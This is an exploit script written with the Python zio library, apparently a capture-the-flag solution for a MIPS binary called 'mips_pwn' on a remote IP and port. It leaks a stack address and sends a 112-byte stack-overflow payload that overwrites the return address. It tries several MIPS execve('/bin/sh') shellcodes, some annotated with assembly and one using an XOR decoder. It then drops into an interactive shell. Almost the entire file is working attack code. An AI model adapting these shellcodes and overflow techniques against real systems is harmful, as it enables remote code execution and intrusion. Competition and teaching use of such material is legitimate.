from zio import *
target = "qemu-mipsel -g 7789 ./mips_pwn"
target = ("106.75.32.60", 10000)
def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")

	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	return io

def pwn(io):
	#sample
	io.read_until(".\n")

	shellcode = ""
	shellcode += "\xff\xff\x10\x04\xab\x0f\x02\x24"
	shellcode += "\x55\xf0\x46\x20\x66\x06\xff\x23"
	shellcode += "\xc2\xf9\xec\x23\x66\x06\xbd\x23"
	shellcode += "\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf"
	shellcode += "\x9a\xf9\xbd\x23\x21\x20\x80\x01"
	shellcode += "\x21\x28\xa0\x03\xcc\xcd\x44\x03"
	shellcode += "/bin/sh";

	#"""
	shellcode = ""
	shellcode += "\x28\x06\xff\xff"#        #/* slti    a2,zero,-1   */
	shellcode += "\x3c\x0f\x2f\x2f"#        #/* lui     t7,0x2f2f    */
	shellcode += "\x35\xef\x62\x69"#        #/* ori     t7,t7,0x6269 */
	shellcode += "\xaf\xaf\xff\xf4"#        #/* sw      t7,-12(sp)   */
	shellcode += "\x3c\x0e\x6e\x2f"#        #/* lui     t6,0x6e2f    */
	shellcode += "\x35\xce\x73\x68"#        #/* ori     t6,t6,0x7368 */
	shellcode += "\xaf\xae\xff\xf8"#        #/* sw      t6,-8(sp)    */
	shellcode += "\xaf\xa0\xff\xfc"#        #/* sw      zero,-4(sp)  */
	shellcode += "\x27\xa4\xff\xf4"#        #/* addiu   a0,sp,-12    */
	shellcode += "\x28\x05\xff\xff"#        #/* slti    a1,zero,-1   */
	shellcode += "\x24\x02\x0f\xab"#        #/* li      v0,4011      */
	shellcode += "\x01\x01\x01\x0c"#        #/* syscall 0x40404     */
	#"""

	shellcode = ""
	shellcode += "\x24\x06\x06\x66" #/* li a2,1638           */
	shellcode += "\x04\xd0\xff\xff" #/* bltzal a2,4100b4 <p> */
	shellcode += "\x28\x06\xff\xff" #/* slti a2,zero,-1      */
	shellcode += "\x27\xbd\xff\xe0" #/* addiu	sp,sp,-32      */
	shellcode += "\x27\xe4\x10\x01" #/* addiu	a0,ra,4097     */
	shellcode += "\x24\x84\xf0\x1f" #/* addiu	a0,a0,-4065    */
	shellcode += "\xaf\xa4\xff\xe8" #/* sw a0,-24(sp)        */
	shellcode += "\xaf\xa0\xff\xec" #/* sw zero,-20(sp)      */
	shellcode += "\x27\xa5\xff\xe8" #/* addiu	a1,sp,-24      */
	shellcode += "\x24\x02\x0f\xab" #/* li v0,4011           */
	shellcode += "\x01\x01\x01\x0c" #/* syscall 0x40404      */
	shellcode += "/bin/sh\x00"          #/* sltiu	v0,k1,26990    */

	shellcode = ""
	shellcode += "\x24\x18\xf9\x9a" #/*  li $t8, -0x666                  */
	shellcode += "\x07\x10\xff\xff" #/*  p:  bltzal $t8, p               */
	shellcode += "\x28\x18\xff\xff" #/*  slti $t8, $zero, -1             */
	shellcode += "\x27\xe8\x10\x01" #/*  addu $t0, $ra, 4097             */
	shellcode += "\x25\x08\xAB\xCD" #/*  addu $t0, $t0, -4097+44+len+1   */
	shellcode += "\x3c\x09\x00\x00" #/*  lui $t1, 0xXXXX                 */
	shellcode += "\x35\x29\x00\x00" #/*  ori $t1, $t1, 0xXXXX            */
	shellcode += "\x3c\x0b\x01\xe0" #/*  lui $t3, 0x01e0                 */
	shellcode += "\x35\x6b\x78\x27" #/*  ori $t3, $t3, 0x7827            */
	shellcode += "\x8d\x0a\xff\xff" #/*  x:  lw $t2, -1($t0)             */ 
	shellcode += "\x01\x49\x60\x26" #/*  xor $t4, $t2, $t1               */
	shellcode += "\xad\x0c\xff\xff" #/*  sw $t4, -1($t0)                 */
	shellcode += "\x25\x08\xff\xfc" #/*  addu $t0, $t0, -4               */
	shellcode += "\x15\x4b\xff\xfb" #/*  bne $t2, $t3, -20               */
	shellcode += "\x01\xe0\x78\x27" #/* nor $t7, $t7, $zero             */
  
	shellcode = '66060624ffffd004ffff0628e0ffbd270110e4271ff08424e8ffa4afecffa0afe8ffa527ab0f02240c0101012f62696e2f7368'.decode('hex')

	shellcode = 'a'*8 + shellcode
	shellcode = shellcode.ljust(112, '\x00')
	io.writeline("2057561479")
	io.read_until("Your input was ")
	data = io.read_until("\n")[:-1]
	addr = int(data, 16)
	print "addr:", hex(addr)

	data = shellcode + l32(addr + 8) + " " + "1234"

	file_w = open("data.in", 'wb')
	file_w.write("2057561479\n")
	file_w.write(shellcode + l32(0x7fff6b74 + 8) + " " + "1234\n")
	file_w.write("exit\n")
	file_w.close()
	"""
	data = '1'*8
	data = data.ljust(112, 'a')
	data += "1234"
	data += " cccc"
	"""
	io.writeline(data)

	io.writeline("exit")
	io.writeline("ls")
	io.interact()


io = get_io(target)
pwn(io)
